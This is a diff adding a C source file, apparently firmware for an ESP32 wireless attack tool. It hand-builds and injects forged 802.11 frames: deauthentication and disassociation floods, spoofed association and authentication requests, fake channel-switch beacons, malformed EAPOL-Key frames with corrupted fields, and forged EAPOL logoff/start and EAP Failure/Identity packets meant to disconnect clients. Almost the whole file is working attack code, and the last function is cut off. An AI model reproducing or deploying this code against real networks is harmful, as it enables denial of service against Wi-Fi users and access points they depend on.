@@ -1,0 +1,1073 @@
+#include <string.h>
+#include <esp_wifi.h>
+#include <esp_log.h>
+#include <freertos/FreeRTOS.h>
+#include <freertos/task.h>
+#include <freertos/timers.h>
+#include <esp_random.h>
+#include <esp_timer.h>
+#include <lwip/inet.h>
+#include <rom/ets_sys.h>
+#include "wifi_attacks.h"
+#include "wifiMng.h"
+#include "libwifi.h"
+
+
+/* DATA RATE 1 Mbps */
+/* Preamble + Header: 192 µs */
+/* Airtime per byte (1Byte×8)/1.000.000 = 8 µs. */
+/* Default packet 64 Byte = 64x8 = 512 µs. */
+/* Default packet Airtime = 192 µs + 512 µs. = 704 µs */
+/* 5 packets burst Airtime = 5x704 µs = ~3.5 ms */
+/* Worst Case (2312 Byte x 8 µs) + 192 µs = 18.7 ms */
+
+/* DATA RATE 11 Mbps */
+/* Preamble(short) + Header: 96 µs */
+/* Airtime per byte (1Byte×8)/11.000.000 = 720 ns. */
+/* Default packet 64 Byte = 64x8 = 46 µs. */
+/* Default packet Airtime = 96 µs + 46 µs. = 142 µs */
+/* 5 packets burst Airtime = 5x142 µs = 710 µs. */
+/* Worst Case (2312 Byte x 720 ns) + 96 µs = 1.76 ms */
+
+/* Time to free TX buffer for CONFIG_ESP_WIFI_DYNAMIC_TX_BUFFER_NUM (64) */
+/* 1 Mbps = Worst Case(18.7 ms) x 64 = 1.2 s */
+/* 11 Mbps = Worst Case(1.76 ms) x 64 = 112 ms s */
+
+/* Realtà (Airtime + IFS): 142+50(DIFS)+Backoff≈200–250 μs. */
+
+static const char *TAG = "WIFI_ATTACKS";
+
+esp_err_t wifi_attack_deauth_basic(const uint8_t dest[6], const uint8_t bssid[6], uint8_t reason_code)
+{
+    if(bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    uint8_t deauth_packet[26] = {
+        0xC0, 0x00, // Frame Control (Deauth)
+        0x3A, 0x01, // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
+        0x00, 0x00, // Sequence Control
+        0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
+    };
+
+    // If not set leave broadcast
+    if(dest != NULL)
+    {
+        memcpy(&deauth_packet[4], dest, 6);    // Destination Address
+    }
+    memcpy(&deauth_packet[10], bssid, 6);    // Source Address
+    memcpy(&deauth_packet[16], bssid, 6);  // BSSID
+    deauth_packet[24] = reason_code;       // Reason Code
+
+    /* Send packet */
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_send_disassoc(const uint8_t bssid[6], const uint8_t dest[6], uint8_t reason)
+{
+    if(bssid == NULL || dest == NULL) return ESP_ERR_INVALID_ARG;
+
+    uint8_t packet[26] = {
+        0xA0, 0x00,                         // Frame Control (Disassociation)
+        0x3A, 0x01,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Target)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence
+        0x00, 0x00                          // Reason Code
+    };
+
+    memcpy(&packet[4], dest, 6);
+    memcpy(&packet[10], bssid, 6);
+    memcpy(&packet[16], bssid, 6);
+    packet[24] = reason; 
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_send_auth_frame(const uint8_t bssid[6], const uint8_t src_mac[6])
+{
+    if(bssid == NULL || src_mac == NULL) return ESP_ERR_INVALID_ARG;
+
+    uint8_t packet[30] = {
+        0xB0, 0x00,                         // Frame Control (Authentication)
+        0x3A, 0x01,                         // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random MAC)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence
+        0x00, 0x00,                         // Algorithm (Open System)
+        0x01, 0x00,                         // Transaction Sequence (1)
+        0x00, 0x00                          // Status Code (Success)
+    };
+
+    memcpy(&packet[4], bssid, 6);
+    memcpy(&packet[10], src_mac, 6);
+    memcpy(&packet[16], bssid, 6);
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_send_assoc_req(const uint8_t bssid[6], const uint8_t src_mac[6])
+{
+    if(bssid == NULL || src_mac == NULL) return ESP_ERR_INVALID_ARG;
+
+    // Association Request minimale
+    uint8_t packet[50] = {
+        0x00, 0x00,                         // FC (Assoc Req)
+        0x3A, 0x01,                         // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dest (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Seq
+        0x11, 0x00,                         // Capab Info
+        0x0A, 0x00,                         // Listen Interval
+        // Tags...
+        0x00, 0x00,                         // SSID Tag (Empty)
+        0x01, 0x01, 0x82                    // Support Rates
+    };
+    
+    memcpy(&packet[4], bssid, 6);
+    memcpy(&packet[10], src_mac, 6);
+    memcpy(&packet[16], bssid, 6);
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_send_csa_beacon(const uint8_t bssid[6], const uint8_t src_mac[6], uint8_t new_channel)
+{
+    if(bssid == NULL || src_mac == NULL) return ESP_ERR_INVALID_ARG;
+    // Beacon Frame spoofato con CSA IE (Tag 37)
+    // Questo dice ai client: "L'AP sta cambiando canale, spostatevi su X!"
+    
+    uint8_t packet[64] = {
+        0x80, 0x00,                         // FC (Beacon)
+        0x00, 0x00,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Seq
+        // Timestamp (8 bytes) dummy
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x64, 0x00,                         // Beacon Interval
+        0x11, 0x00,                         // Capab Info
+        // Tags
+        0x00, 0x00,                         // SSID (Empty/Hidden)
+        // CHANNEL SWITCH ANNOUNCEMENT IE (Tag 37)
+        0x25, 0x03,                         // Tag 37, Len 3
+        0x00,                               // Channel Switch Mode (0=No TX until switch)
+        new_channel,                        // New Channel Number
+        0x00                                // Channel Switch Count (0 = Immediately)
+    };
+
+    memcpy(&packet[10], bssid, 6);
+    memcpy(&packet[16], bssid, 6);
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_client_invalid_PMKID(const uint8_t client[6], const uint8_t bssid[6])
+{
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint64_t replay_counter = 2000;
+
+    // Dimensione Corretta: 145 Byte
+    // Header (36) + Body (109) = 145
+    uint8_t eapol_packet_invalid_PMKID[145] = {
+        /* --- 802.11 HEADER (24 Byte) --- */
+        0x08, 0x02,                         // [0-1] Frame Control
+        0x00, 0x00,                         // [2-3] Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // [4-9] A1: Dest
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // [10-15] A2: Src
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // [16-21] A3: BSSID
+        0x00, 0x00,                         // [22-23] Seq
+
+        /* --- LLC/SNAP HEADER (8 Byte) --- */
+        0xAA, 0xAA, 0x03,                   // [24-26] LLC
+        0x00, 0x00, 0x00,                   // [27-29] OUI
+        0x88, 0x8E,                         // [30-31] EtherType (EAPOL)
+
+        /* --- EAPOL HEADER (4 Byte) --- */
+        0x01,                               // [32] Version
+        0x03,                               // [33] Type (3 = EAPOL-Key)
+        0x00, 0x6D,                         // [34-35] Length (109 byte di body)
+
+        /* --- EAPOL-KEY BODY (109 Byte) --- */
+        0x02,                               // [36] Descriptor Type (RSN)
+        0xCA, 0x00,                         // [37-38] Key Info
+        0x00, 0x00,                         // [39-40] Key Length (MANCAVA! Standard richiede 2 byte qui)
+
+        // [41-48] Replay Counter (8 Byte)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        // [49-80] Key Nonce (32 Byte)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        // [81-96] Key IV (16 Byte - Standard WPA)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        // [97-104] Key RSC (8 Byte)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        // [105-120] Key MIC (16 Byte - Standard WPA)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        0x00, 0x16,                         // [121-122] Key Data Length (22 Byte)
+
+        /* --- Key Data (Attack Payload) --- */
+        0xDD,                               // [123] Tag (Vendor Specific)
+        0xFF,                               // [124] Length CORRUPTED (0xFF = Fuzzing)
+        0x00, 0x0F, 0xAC, 0x04,             // [125-128] OUI + Type
+        
+        // [129-144] PMKID (16 Byte - Deve essere 16 byte per matchare length 22)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+
+    memcpy(&eapol_packet_invalid_PMKID[4], client, 6);    // Destinazione
+    memcpy(&eapol_packet_invalid_PMKID[10], bssid, 6);    // Sorgente
+    memcpy(&eapol_packet_invalid_PMKID[16], bssid, 6);    // BSSID
+
+    // (36 Headers + 1 Type + 2 Info + 2 KeyLen = 41)
+    for (uint8_t i = 0; i < 8; i++) {
+        eapol_packet_invalid_PMKID[41 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
+    }
+
+    replay_counter++;
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_client_bad_msg1(const uint8_t client[6], const uint8_t bssid[6], const wifi_auth_mode_t authmode)
+{
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint64_t replay_counter = 0;
+    uint8_t frame_size = 153; // Size of the EAPOL frame
+    uint8_t eapol_packet_bad_msg1[153] = {
+        0x08, 0x02,//0x02,                         // Frame Control (EAPOL)
+        0x00, 0x00,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x30, 0x00,                         // Sequence Control
+        //0x05, 0x00,                         // QoS‑Control
+        /* LLC / SNAP */
+        0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
+        0x88, 0x8e,                          // Ethertype = EAPOL
+        /* -------- 802.1X Header -------- */
+        0x02,                               // Version 802.1X‑2004
+        0x03,                               // Type Key
+        0x00, 0x75,                          // Length 117 bytes
+        /* -------- EAPOL‑Key frame body (117 B) -------- */
+        0x02,                               // Desc Type 2 (AES/CCMP)
+        0x00, 0xCA,                          // Key Info (Install|Ack…)
+        0x00, 0x10,                          // Key Length = 16
+        /* Replay Counter (8) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+        /* Nonce (32) */
+        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
+        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
+        /* Key IV (16) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Key RSC (8) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Key ID  (8) */ 
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Key MIC (16) */ 
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Key Data Len (2) */ 
+        0x00, 0x16,
+        /* Key Data (22 B) */
+        0xDD, 0x14,//0x14,                // Vendor‑specific (PMKID IE)
+        0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
+        /* PMKID (16 byte zero) */
+        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 
+        0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11
+    };
+
+    memcpy(&eapol_packet_bad_msg1[4], client, 6);    // Destination Address (Client MAC)
+    memcpy(&eapol_packet_bad_msg1[10], bssid, 6);    // Source Address
+    memcpy(&eapol_packet_bad_msg1[16], bssid, 6);    // BSSID
+
+    /* Generate random Nonce */
+    for (uint8_t i = 0; i < 32; i++) {
+        eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF; // Put random values in Key Nonce
+    }
+    /* Update replay counter */
+    for (uint8_t i = 0; i < 8; i++) {
+        eapol_packet_bad_msg1[41 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
+    }
+
+    /* Set WPA/WPA2 or WPA3 */
+    if(authmode == WIFI_AUTH_WPA3_PSK || authmode == WIFI_AUTH_WPA3_ENTERPRISE || authmode == WIFI_AUTH_WAPI_PSK || authmode == WIFI_AUTH_WPA2_WPA3_PSK) 
+    {
+        eapol_packet_bad_msg1[35] = 0x5f;      // Length 95 Bytes
+        eapol_packet_bad_msg1[38] = 0xcb;//0x8a;//0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+        eapol_packet_bad_msg1[130] = 0x00; // Key Data Length (LSB) 22 Bytes
+        frame_size = frame_size - 22; // Adjust frame size for WPA3
+    }
+
+    /* Increase replay counter for next packet */
+    replay_counter++;
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, frame_size, false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_association_sleep(const uint8_t client[6], const uint8_t bssid[6], const char *ssid)
+{
+    if(client == NULL || bssid == NULL || ssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint16_t sequence_number = 0;
+    uint8_t assoc_packet[200] = {
+        0x00, 0x10, // Frame Control (Association Request) PM=1
+        0x3a, 0x01, // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence Control
+        0x31, 0x00,                         // Capability Information (PM=1)
+        0x0a, 0x00,                         // Listen Interval
+        0x00,                               // SSID tag
+        0x00,                               // SSID length      
+    };
+    memcpy(&assoc_packet[10], client, 6);   // Source Address
+    memcpy(&assoc_packet[4],  bssid, 6);    // Destination Address (AP)
+    memcpy(&assoc_packet[16], bssid, 6);    // BSSID
+
+    /* Set Sequence Control */
+    assoc_packet[23] = (sequence_number >> 8) & 0xFF; // Sequence Number MSB
+    assoc_packet[22] = sequence_number & 0xFF;        // Sequence Number LSB
+
+    /* SSID tag */
+    assoc_packet[29] = (uint8_t)strlen(ssid); // SSID Length
+    memcpy(&assoc_packet[30], ssid, strlen(ssid)); // SSID
+
+    /* Supported Rates tag */
+    uint16_t offset = 30 + strlen(ssid); // Offset after SSID);
+    assoc_packet[offset++] = 0x01; // Supported Rates tag
+    assoc_packet[offset++] = 0x04; // Length
+    assoc_packet[offset++] = 0x82;  // 1 Mbps
+    assoc_packet[offset++] = 0x04;  // 2 Mbps
+    assoc_packet[offset++] = 0x0b;  // 5.5 Mbps
+    assoc_packet[offset++] = 0x16;  // 11 Mbps
+
+    /* Power Capability tag */
+    assoc_packet[offset++] = 0x21; // Power Capability tag
+    assoc_packet[offset++] = 0x02; // Length
+    assoc_packet[offset++] = 0x01; // Min Tx Power
+    assoc_packet[offset++] = 0x15; // Max Tx Power
+
+    /* Supported Channels tag */
+    assoc_packet[offset++] = 0x24; // Supported Channels tag
+    assoc_packet[offset++] = 0x02; // Length
+    assoc_packet[offset++] = 0x01; // First Channel
+    assoc_packet[offset++] = 0x0d; // Last Channel
+
+    /* RSN tag */
+    assoc_packet[offset++] = 0x30; // RSN tag
+    assoc_packet[offset++] = 0x14; // Length
+    assoc_packet[offset++] = 0x01; // Version MSB
+    assoc_packet[offset++] = 0x00; // Version LSB
+    assoc_packet[offset++] = 0x00; // Group Cipher Suite OUI MSB
+    assoc_packet[offset++] = 0x0F; // Group Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0xAC; // Group Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0x04; // Group Cipher Suite Type (AES-CCMP)
+    assoc_packet[offset++] = 0x01; // Pairwise Cipher Suite Count
+    assoc_packet[offset++] = 0x00; // Pairwise Cipher Suite Count MSB
+    assoc_packet[offset++] = 0x00; // Pairwise Cipher Suite OUI MSB
+    assoc_packet[offset++] = 0x0F; // Pairwise Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0xAC; // Pairwise Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0x04; // Pairwise Cipher Suite Type (AES-CCMP)
+    assoc_packet[offset++] = 0x01; // AKM Suite Count
+    assoc_packet[offset++] = 0x00; // AKM Suite Count MSB
+    assoc_packet[offset++] = 0x00; // AKM Suite OUI MSB
+    assoc_packet[offset++] = 0x0f; // AKM Suite OUI MSB
+    assoc_packet[offset++] = 0xAC; // AKM Suite OUI LSB
+    assoc_packet[offset++] = 0x02; // AKM Suite OUI LSB (WPA2-PSK)
+    assoc_packet[offset++] = 0x0c; // RSN Capabilities MSB
+    assoc_packet[offset++] = 0x00; // RSN Capabilities LSB
+
+    /* Supported Operating Classes tag */
+    assoc_packet[offset++] = 0x3b; // Supported Operating Classes tag
+    assoc_packet[offset++] = 0x14; // Length
+    assoc_packet[offset++] = 0x51; // Current Operating Class 1 (2.4 GHz)
+    /* alternate Operating Class */
+    assoc_packet[offset++] = 0x86; // Operating Class 2 (5 GHz)
+    assoc_packet[offset++] = 0x85; // Operating Class 3 (6 GHz)
+    assoc_packet[offset++] = 0x84; // Operating Class 4 (60 GHz)
+    assoc_packet[offset++] = 0x83; // Operating Class 5 (60 GHz)
+    assoc_packet[offset++] = 0x81; // Operating Class 6 (60 GHz)
+    assoc_packet[offset++] = 0x7f; // Operating Class 7 (60 GHz)
+    assoc_packet[offset++] = 0x7e; // Operating Class 8 (60 GHz)
+    assoc_packet[offset++] = 0x7d; // Operating Class 9 (60 GHz)
+    assoc_packet[offset++] = 0x7c; // Operating Class 10 (60 GHz)
+    assoc_packet[offset++] = 0x7b; // Operating Class 11 (60 GHz)
+    assoc_packet[offset++] = 0x7a; // Operating Class 12 (60 GHz)
+    assoc_packet[offset++] = 0x79; // Operating Class 13 (60 GHz)
+    assoc_packet[offset++] = 0x78; // Operating Class 14 (60 GHz)
+    assoc_packet[offset++] = 0x77; // Operating Class 15 (60 GHz)
+    assoc_packet[offset++] = 0x76; // Operating Class 16 (60 GHz)
+    assoc_packet[offset++] = 0x75; // Operating Class 17 (60 GHz)
+    assoc_packet[offset++] = 0x74; // Operating Class 18 (60 GHz)
+    assoc_packet[offset++] = 0x73; // Operating Class 19 (60 GHz)
+    assoc_packet[offset++] = 0x51; // Operating Class 20 (2.4 GHz)
+
+    /* Vendor Specific tag */
+    assoc_packet[offset++] = 0xdd; // Vendor Specific tag
+    assoc_packet[offset++] = 0x0a; // Length
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x10;
+    assoc_packet[offset++] = 0x18;
+    assoc_packet[offset++] = 0x02;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x10;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x02;
+
+    sequence_number += 0x10; // Increment sequence number by 16;
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, offset, false);   
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_ap_eapol_logoff(const uint8_t client[6], const uint8_t bssid[6])
+{
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    uint8_t eapol_logoff_packet[38] = {
+        0x88, 0x11, // Frame Control (EAPOL)
+        0x00, 0x00, // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence Control
+        0x05, 0x00,                         // QoS‑Control
+        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
+        0x88, 0x8E,                         // EAPOL Ethertype
+        0x02,                               // EAP Version
+        0x02,                               // EAPOL-Type (Logoff)
+        0x00, 0x00                          // EAPOL Length
+    };
+    memcpy(&eapol_logoff_packet[10], client, 6);    // Source Address
+    memcpy(&eapol_logoff_packet[4], bssid, 6);      // Destination Address (AP)
+    memcpy(&eapol_logoff_packet[16], bssid, 6);     // BSSID
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_client_eap_failure(const uint8_t client[6], const uint8_t bssid[6])
+{
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint8_t identity = 0;
+    uint8_t eap_failure_packet[40] = {
+        /* --- 802.11 HEADER (24 Byte) --- */
+        0x08, 0x02,                         // Frame Control (Data, FromDS)
+        0x00, 0x00,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // A1: Destination (Client - Sarà sovrascritto)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // A2: Source (BSSID - Sarà sovrascritto)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // A3: BSSID (Sarà sovrascritto)
+        0x00, 0x00,                         // Sequence Control (0 va bene per injection brutale)
+
+        /* --- LLC/SNAP HEADER (8 Byte) --- */
+        0xAA, 0xAA, 0x03,                   // DSAP, SSAP, Control
+        0x00, 0x00, 0x00,                   // OUI (Encapsulated Ethernet)
+        0x88, 0x8E,                         // EtherType (EAPOL)
+
+        /* --- EAPOL HEADER (4 Byte) --- */
+        0x01,                               // Version (802.1X-2001)
+        0x00,                               // Type: 0 = EAP Packet (Fondamentale!)
+        0x00, 0x04,                         // Length: 4 byte (Lunghezza del payload EAP sotto)
+
+        /* --- EAP PAYLOAD (4 Byte) --- */
+        0x04,                               // Code: 4 = FAILURE
+        0x00,                               // ID
+        0x00, 0x04                          // Length: 4 byte (Lunghezza totale EAP)
+    };
+
+    eap_failure_packet[37] = identity++;
+    memcpy(&eap_failure_packet[4], client, 6);   // A1: Destinazione (Client)
+    memcpy(&eap_failure_packet[10], bssid, 6);   // A2: Sorgente (BSSID)
+    memcpy(&eap_failure_packet[16], bssid, 6);   // A3: BSSID
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_client_eap_rounds(const uint8_t client[6], const uint8_t bssid[6])
+{
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint8_t identity = 0;
+    uint8_t eap_identity_request_packet[41] = {
+        /* --- 802.11 HEADER (24 Byte) --- */
+        0x08, 0x02,                         // 0-1: Frame Control (Data)
+        0x00, 0x00,                         // 2-3: Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // 4-9: A1 (Dest - Client)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15: A2 (Src - BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21: A3 (BSSID)
+        0x00, 0x00,                         // 22-23: Seq Control
+
+        /* --- LLC/SNAP HEADER (8 Byte) --- */
+        0xAA, 0xAA, 0x03,                   // 24-26: LLC
+        0x00, 0x00, 0x00,                   // 27-29: OUI
+        0x88, 0x8E,                         // 30-31: EtherType (EAPOL)
+
+        /* --- EAPOL HEADER (4 Byte) --- */
+        0x01,                               // 32: Version (802.1X-2001)
+        0x00,                               // 33: Type (0 = EAP Packet)
+        0x00, 0x05,                         // 34-35: Length (Payload EAP è 5 byte)
+
+        /* --- EAP PAYLOAD (5 Byte) --- */
+        0x01,                               // 36: Code (1 = REQUEST)
+        0x00,                               // 37: ID (DA CAMBIARE)
+        0x00, 0x05,                         // 38-39: Length (Code+ID+Len+Type = 5)
+        0x01                                // 40: Type (1 = Identity)
+    };
+
+    eap_identity_request_packet[37] = identity++;
+    memcpy(&eap_identity_request_packet[4], client, 6);   // A1
+    memcpy(&eap_identity_request_packet[10], bssid, 6);   // A2
+    memcpy(&eap_identity_request_packet[16], bssid, 6);   // A3
+    
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_ap_eapol_start(const uint8_t client[6], const uint8_t bssid[6])
+{
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    uint8_t eapol_start_packet[36] = {
+        0x08, 0x02, // Frame Control (EAPOL)
+        0x00, 0x00, // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence Control
+        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
+        0x88, 0x8E,                         // EAPOL Ethertype
+        0x01, 0x01,                         // EAPOL Version and Type (Start)
+        0x00, 0x00                          // EAPOL Length (0 for Start packets)
+    };
+    memcpy(&eapol_start_packet[4], client, 6);    // Destination Address (Client MAC) 
+    memcpy(&eapol_start_packet[10], bssid, 6);    // Source Address
+    memcpy(&eapol_start_packet[16], bssid, 6);    // BSSID
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_deauth_client_negative_tx_power(const uint8_t bssid[6], uint8_t channel, const char *ssid)
+{
+    if(ssid == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    uint8_t packet[256];
+    
+    // --- HEADER MAC (36 Byte) ---
+    packet[0] = 0x80; packet[1] = 0x00; // Beacon
+    packet[2] = 0x00; packet[3] = 0x00; // Duration
+    memset(&packet[4], 0xFF, 6);        // Dest: Broadcast
+    memcpy(&packet[10], bssid, 6);      // Src: AP
+    memcpy(&packet[16], bssid, 6);      // BSSID: AP
+    packet[22] = 0x00; packet[23] = 0x00; // Seq
+
+    // Fixed Params
+    memset(&packet[24], 0x00, 8);       // Timestamp
+    packet[32] = 0x64; packet[33] = 0x00; // Interval
+    // Capability: Spectrum Mgmt (bit 8) + Short Preamble
+    packet[34] = 0x05; packet[35] = 0x01; 
+
+    uint16_t offset = 36;
+    // --- TAGS ---
+    // 1. SSID
